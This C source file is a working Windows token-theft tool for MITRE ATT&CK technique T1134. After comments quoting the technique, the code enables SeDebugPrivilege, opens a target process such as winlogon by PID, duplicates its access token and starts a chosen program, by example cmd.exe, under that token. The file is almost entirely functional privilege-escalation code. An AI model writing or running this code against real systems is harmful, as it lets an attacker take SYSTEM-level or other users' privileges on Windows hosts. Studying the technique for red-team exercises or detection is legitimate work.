
//https://attack.mitre.org/wiki/Technique/T1134
//Access tokens can be leveraged by adversaries through three methods : 3
//
//Token Impersonation / Theft - An adversary creates a new access token that duplicates an existing token using DuplicateToken(Ex).
//The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context,
//or with SetThreadToken to assign the impersonated token to a thread. This is useful for when the target user has a non-network logon session on the system.
//
//Create Process with a Token - An adversary creates a new access token with DuplicateToken(Ex) and uses it with CreateProcessWithTokenW 
//to create a new process running under the security context of the impersonated user.This is useful for creating a new process under the
//security context of a different user.
//
//Make and Impersonate Token - An adversary has a username and password but the user is not logged onto the system.The adversary can then 
//create a logon session for the user using the LogonUser function.The function will return a copy of the new session's access token and the
//adversary can use SetThreadToken to assign the token to a thread.
//
//Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.

//plan
//open winkogon process(PROCESS_QUERY_INFORMATION)
//open process token(TOKEN_QUERY | TOKEN_DUPLICATE)
//DuplicateToken
//CreateProcessWithTokenW -> process must have SeImpersonatePrivilege

//to work with win10 do static link compile
//project property->configuration property -> C/C++ -> code generation -> runtime = libraru multi thread MT

#include<windows.h>
#include<stdio.h>
#include<string.h>

typedef DWORD(WINAPI*RTADJUST)(QWORD, BOOL, BOOL, PBOOL);											//function pointer for RtlAdjustPrivilege

void main(DWORD argc, LPCSTR argv[]){

	if (argc != 3){
		printf("\nUsage: %s pid application_to_runas\nExample: %s 460 cmd.exe\n\n", argv[0], argv[0]);
		exit(0);
	}

	BOOL privOut;
	RTADJUST lpRtlAdjustPrivilege;
	HANDLE hWinlogonProcess;
	HANDLE hWinlogonToken;
	HANDLE hDupToken;
	WCHAR wcmd[0xffff];
	//LPCWSTR cmd = L"C:\\Windows\\System32\\cmd.exe";
	STARTUPINFO si = { 0 };																			//zero our struct, required! or call ZeroMemory
	PROCESS_INFORMATION pi = { 0 };
	DWORD pid = atoi(argv[1]);																		//convert pid to int
	MultiByteToWideChar(CP_OEMCP, 0, argv[2], -1, wcmd, strlen(argv[2]) + 1);								//convert ASCII appliction name to unicode

	lpRtlAdjustPrivilege = (RTADJUST)GetProcAddress(LoadLibrary("ntdll"), "RtlAdjustPrivilege");	//get RtlAdjustPrivilege proc address
	printf("GetProcAddress error: %i\n", GetLastError());

	lpRtlAdjustPrivilege(20, 1, 0, &privOut);														//enable SeDebugPrivilege(need to be administrator)
	printf("RtlAdjustPrivilege error: %i\n", GetLastError());
	//ZeroMemory(&si, sizeof(STARTUPINFO));	
	//ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	hWinlogonProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);							//open the process
	printf("openprocess error: %i\n", GetLastError());

	OpenProcessToken(hWinlogonProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hWinlogonToken);		//get the process token
	printf("OpenProcessToken error: %i\n", GetLastError());

	DuplicateTokenEx(hWinlogonToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);
	printf("DuplicateTokenEx error: %i\n", GetLastError());										//copy the process stoken

	CreateProcessWithTokenW(hDupToken, 0, wcmd, NULL, NULL, NULL, NULL, &si, &pi);				//create new process wit the dup token
	printf("CreateProcessWithTokenW error: %i\n", GetLastError());

	printf("\n");
	CloseHandle(hWinlogonProcess);																	//cleanup
	CloseHandle(hWinlogonToken);
	CloseHandle(hDupToken);
}